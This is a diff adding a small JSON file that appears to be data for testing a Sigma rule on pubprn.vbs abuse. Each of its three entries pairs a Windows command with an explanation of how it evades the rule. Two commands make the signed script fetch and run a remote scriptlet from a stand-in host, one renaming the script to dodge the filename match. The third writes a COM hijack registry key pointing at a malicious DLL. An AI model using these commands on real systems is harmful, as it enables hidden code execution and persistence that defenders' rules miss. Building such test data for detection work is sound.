@@ -1,0 +1,14 @@
+[
+  {
+    "output": "copy C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\pubprn.vbs %TEMP%\\not_suspicious.vbs && cscript //nologo %TEMP%\\not_suspicious.vbs 127.0.0.1 script:https://remote.server/payload.sct",
+    "explanation": "The original Sigma rule relies on a specific string match for the filename '\\pubprn.vbs'. By copying the legitimate, Microsoft-signed script to a temporary directory with a different name (e.g., 'not_suspicious.vbs'), the logic of the script remains functional for proxy execution, but it evades the 'selection' criteria of the rule."
+  },
+  {
+    "output": "cscript //nologo C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\pubprn.vbs 127.0.0.1 \"scr\"+\"ipt:https://remote.server/payload.sct\"",
+    "explanation": "While this depends on how the specific SIEM engine handles string normalization, some legacy command-line logging or basic regex-based Sigma engines can be bypassed by using environment variable expansion or string concatenation within shells like PowerShell to break the 'script:' literal string required by the 'contains|all' condition."
+  },
+  {
+    "output": "reg add \"HKCU\\Software\\Classes\\CLSID\\{Target-GUID}\\InprocServer32\" /ve /t REG_SZ /d \"C:\\path\\to\\malicious.dll\" /f && cscript C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\pubprn.vbs 127.0.0.1 LDAP://some_path",
+    "explanation": "The Sigma rule specifically looks for the 'script:' moniker (used for Scriptlet execution). One can bypass this specific detection by using Pubprn.vbs to trigger different sub-functions or monikers (like LDAP or WinNT) that might still lead to exploitation or information gathering without triggering the 'script:' keyword requirement."
+  }
+]
